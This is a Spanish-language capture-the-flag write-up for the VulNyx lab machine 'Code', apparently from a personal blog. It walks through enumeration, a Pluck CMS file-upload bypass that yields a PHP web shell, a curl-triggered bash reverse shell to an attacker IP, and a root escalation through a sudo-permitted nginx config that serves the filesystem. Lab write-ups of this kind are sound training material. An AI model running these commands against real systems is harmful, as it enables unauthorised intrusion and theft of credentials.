@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="es"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">VulNyx - Code | noname</title>
+<meta property="og:title" content="VulNyx - Code | noname" />
+<meta name="twitter:title" content="VulNyx - Code | noname" />
+<meta itemprop="name" content="VulNyx - Code | noname" />
+<meta name="application-name" content="VulNyx - Code | noname" />
+<meta property="og:site_name" content="" />
+
+<meta name="description" content="Writeup Code 🟢">
+<meta itemprop="description" content="Writeup Code 🟢" />
+<meta property="og:description" content="Writeup Code 🟢" />
+<meta name="twitter:description" content="Writeup Code 🟢" />
+
+<meta property="og:locale" content="es" />
+<meta name="language" content="es" />
+
+  <link rel="alternate" hreflang="en" href="https://0x-noname.github.io/writeups/nyx/code/" title="" />
+
+
+
+  <meta itemprop="image" content="https://0x-noname.github.io/images/logo.png" />
+  <meta property="og:image" content="https://0x-noname.github.io/images/logo.png" />
+  <meta name="twitter:image" content="https://0x-noname.github.io/images/logo.png" />
+  <meta name="twitter:image:src" content="https://0x-noname.github.io/images/logo.png" />
+
+
+
+
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2023-11-28T19:22:10&#43;0200 />
+    <meta property="article:published_time" content=2023-11-28T19:22:10&#43;0200 />
+
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "VulNyx - Code",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2023-11-28",
+        "description": "Writeup Code 🟢",
+        "wordCount":  590 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2023-11-28",
+        "image": {
+        "@type": "imageObject",
+        "url": "\/images\/logo.png"
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "noname"
+        }
+    }
+    </script>
+
+
+
+<meta name="generator" content="Hugo 0.125.7">
+
+    
+
+    <link rel="canonical" href="https://0x-noname.github.io/writeups/nyx/code/">
+    <link href="/style.min.d43bc6c79baa87f006efb2b92be952faeedeb1a3ab626c1d6abda52eae049355.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="https://0x-noname.github.io/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    
+  
+
+</head>
+<body data-theme = "" class="notransition">
+
+<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="https://0x-noname.github.io/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title></title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        $ home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/posts/hackmyvm/">
+                        $ hmv
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/posts/hackthebox/">
+                        $ htb
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/posts/vulnyx/">
+                        $ nyx
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/whoami/">
+                        $ whoami
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">VulNyx - Code</h1>
+                
+                
+                <div class="post-meta">
+                    <time datetime="2023-11-28T19:22:10&#43;02:00" itemprop="datePublished"> Nov 28, 2023 </time>
+                </div>
+                
+            </header>
+            
+            <div class="page-content">
+                <p><img src="/../machines/nyx/code/code_logo.webp" alt="logo"></p>
+<ul>
+<li><em>Pluck CMS 4.7.13 - File Upload RCE (Authenticated) - Manual</em></li>
+<li><em>Abuse bash Binary - User Pivoting</em></li>
+<li><em>Abuse nginx Binary - Privesc</em></li>
+</ul>
+<h3 id="escaneo-de-puertos">Escaneo de puertos</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ nmap -p- -T5 -n -v 192.168.1.14
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE
+</span></span><span class="line"><span class="cl">22/tcp open  ssh
+</span></span><span class="line"><span class="cl">80/tcp open  http
+</span></span></code></pre></div><h3 id="escaneo-de-servicios">Escaneo de servicios</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ nmap -sVC -v -p 22,80 192.168.1.14
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
+</span></span><span class="line"><span class="cl">| ssh-hostkey: 
+</span></span><span class="line"><span class="cl">|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
+</span></span><span class="line"><span class="cl">|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.57 ((Debian))
+</span></span><span class="line"><span class="cl">| http-methods: 
+</span></span><span class="line"><span class="cl">|_  Supported Methods: OPTIONS HEAD GET POST
+</span></span><span class="line"><span class="cl">|_http-title: Apache2 Debian Default Page: It works
+</span></span><span class="line"><span class="cl">|_http-server-header: Apache/2.4.57 (Debian)
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><h3 id="http-tcp---80">HTTP TCP - 80</h3>
+<p><img src="/../machines/nyx/code/http.webp" alt="http"></p>
+<p>Realizo fuerza bruta de directorios.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ gobuster dir -u 192.168.1.14 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</span></span><span class="line"><span class="cl">===============================================================
+</span></span><span class="line"><span class="cl">Gobuster v3.6
+</span></span><span class="line"><span class="cl">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+</span></span><span class="line"><span class="cl">===============================================================
+</span></span><span class="line"><span class="cl">[+] Url:                     http://192.168.1.14
+</span></span><span class="line"><span class="cl">[+] Method:                  GET
+</span></span><span class="line"><span class="cl">[+] Threads:                 10
+</span></span><span class="line"><span class="cl">[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</span></span><span class="line"><span class="cl">[+] Negative Status codes:   404
+</span></span><span class="line"><span class="cl">[+] User Agent:              gobuster/3.6
+</span></span><span class="line"><span class="cl">[+] Timeout:                 10s
+</span></span><span class="line"><span class="cl">===============================================================
+</span></span><span class="line"><span class="cl">Starting gobuster in directory enumeration mode
+</span></span><span class="line"><span class="cl">===============================================================
+</span></span><span class="line"><span class="cl">/pluck                (Status: 301) [Size: 312] [--&gt; http://192.168.1.14/pluck/]
+</span></span></code></pre></div><p>Visito el nuevo directorio.</p>
+<p><img src="/../machines/nyx/code/pluck.webp" alt="pluck"></p>
+<p>Al darle click a admin me lleva a un formulario de login, también se puede apreciar la versión <code>pluck 4.7.13</code>.</p>
+<p><img src="/../machines/nyx/code/adminpluck.webp" alt="adminpluck"></p>
+<p>Pruebo contraseñas por defecto y consigo acceder al panel.</p>
+<p><img src="/../machines/nyx/code/adminPanel.webp" alt="adminPanel"></p>
+<p>Me voy a <code>pages/manage files</code></p>
+<p><img src="/../machines/nyx/code/menumanage.webp" alt="menumanage"></p>
+<p>En <code>manage files</code> subo una shell.</p>
+<p><img src="/../machines/nyx/code/managefiles.webp" alt="managefiles"></p>
+<p>La sube correctamente pero convierte el archivo <strong>php</strong> en <strong>txt</strong>.</p>
+<p><img src="/../machines/nyx/code/uploadoktxt.webp" alt="uploadoktxt"></p>
+<p>Si visualizo el archivo se puede observar que es un txt.</p>
+<p><img src="/../machines/nyx/code/cmdtext.webp" alt="cmdtext"></p>
+<p>Abro burpusite e intercepto la petición.</p>
+<p><img src="/../machines/nyx/code/burpsuite.webp" alt="burpsuite"></p>
+<p>Mando la peticion al intruder.</p>
+<p><img src="/../machines/nyx/code/intruder-payload.webp" alt="intruder-payload"></p>
+<p>En payload añado una lista de extensiones.</p>
+<p><img src="/../machines/nyx/code/extensions.webp" alt="extensions"></p>
+<p>Una vez termina me voy al directorio files y observo que varias extensiones no se han convertido en txt.</p>
+<p><img src="/../machines/nyx/code/filesD.webp" alt="filesD"></p>
+<p>Obtengo ejecución remota de comandos con el archivo <code>cmd.phar</code>.</p>
+<p><img src="/../machines/nyx/code/RCE.webp" alt="RCE"></p>
+<p>Uso curl para mandarme una shell de bash.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ curl &#34;192.168.1.14/pluck/files/cmd.phar?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.17%2F4444%200%3E%261%22&#34;
+</span></span></code></pre></div><p>Obtengo la shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ nc -lvp 4444
+</span></span><span class="line"><span class="cl">listening on [any] 4444 ...
+</span></span><span class="line"><span class="cl">192.168.1.14: inverse host lookup failed: Unknown host
+</span></span><span class="line"><span class="cl">connect to [192.168.1.17] from (UNKNOWN) [192.168.1.14] 34882
+</span></span><span class="line"><span class="cl">bash: cannot set terminal process group (482): Inappropriate ioctl for device
+</span></span><span class="line"><span class="cl">bash: no job control in this shell
+</span></span><span class="line"><span class="cl">www-data@code:/var/www/html/pluck/files$ id
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl">uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span></span></code></pre></div><p>Enumero permisos de sudo.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">www-data@code:/var/www/html/pluck/files$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries for www-data on code:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
+</span></span><span class="line"><span class="cl">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+</span></span><span class="line"><span class="cl">    use_pty
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User www-data may run the following commands on code:
+</span></span><span class="line"><span class="cl">    (dave) NOPASSWD: /usr/bin/bash
+</span></span></code></pre></div><p>Paso de usuario <strong>www-data</strong> a <strong>dave</strong> de la siguiente forma.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">www-data@code:/var/www/html/pluck/files$ sudo -u dave /usr/bin/bash
+</span></span><span class="line"><span class="cl">dave@code:/var/www/html/pluck/files$ id
+</span></span><span class="line"><span class="cl">uid=1000(dave) gid=1000(dave) groups=1000(dave)
+</span></span></code></pre></div><p>Vuelvo a enumerar permisos de sudo.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">dave@code:~$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries for dave on code:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
+</span></span><span class="line"><span class="cl">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+</span></span><span class="line"><span class="cl">    use_pty
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User dave may run the following commands on code:
+</span></span><span class="line"><span class="cl">    (root) NOPASSWD: /usr/sbin/nginx
+</span></span></code></pre></div><p>Después de varias pruebas <strong>d4t4s3c</strong> me da una pista para a crear el archivo <code>nginx.conf</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nginx" data-lang="nginx"><span class="line"><span class="cl"><span class="k">user</span> <span class="s">root</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">events</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kn">worker_connections</span> <span class="mi">1024</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">http</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kn">server</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kn">listen</span> <span class="mi">65001</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kn">location</span> <span class="s">/</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kn">root</span> <span class="s">/</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Con <code>socket statistics</code> compruebo las conexiones de red.</p>
+<p><img src="/../machines/nyx/code/ss.webp" alt="ss"></p>
+<p>Lanzo nginx  con la flag <code>-c</code> para que el binario use el archivo de configuración que tengo en la carpeta <code>/tmp</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">dave@code:/tmp$ sudo /usr/sbin/nginx -c /tmp/nginx.conf
+</span></span></code></pre></div><p>Compruebo que nginx se ha iniciado correctamente.</p>
+<p><img src="/../machines/nyx/code/nginx-ss.webp" alt="nginx-ss"></p>
+<p>Con curl obtengo la llave rsa de root pero se puede observar que está encriptada.</p>
+<p><img src="/../machines/nyx/code/id_rsa.webp" alt="id_rsa"></p>
+<blockquote>
+<p>He intentado romper el passphrase sin éxito y después de darle muchas vueltas <code>d4t4s3c</code> me ha ofrecido una valiosa pista que me ha llevado al siguiente directorio el cual ya visité anteriormente pero por una mala enumeración se me pasó por alto el archivo <code>pass.php</code>.</p>
+</blockquote>
+<p><img src="/../machines/nyx/code/pluck-settings.webp" alt="pluck-settings"></p>
+<p>Lanzo cat para ver el contenido de <code>pass.php</code> y encuentro una cadena que parece ser una contraseña.</p>
+<p><img src="/../machines/nyx/code/passphp.webp" alt="passphp"></p>
+<p>Obtengo el root.</p>
+<p><img src="/../machines/nyx/code/root.webp" alt="root"></p>
+<p>Y aquí termina la máquina Code.</p>
+<p>Saludos!</p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/0x-noname" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2024 .
+        
+    </small>
+</footer><a href="#" title="" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+
+
+    
+    <script src="https://0x-noname.github.io/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>
+
+    
+
+</body>
+</html>
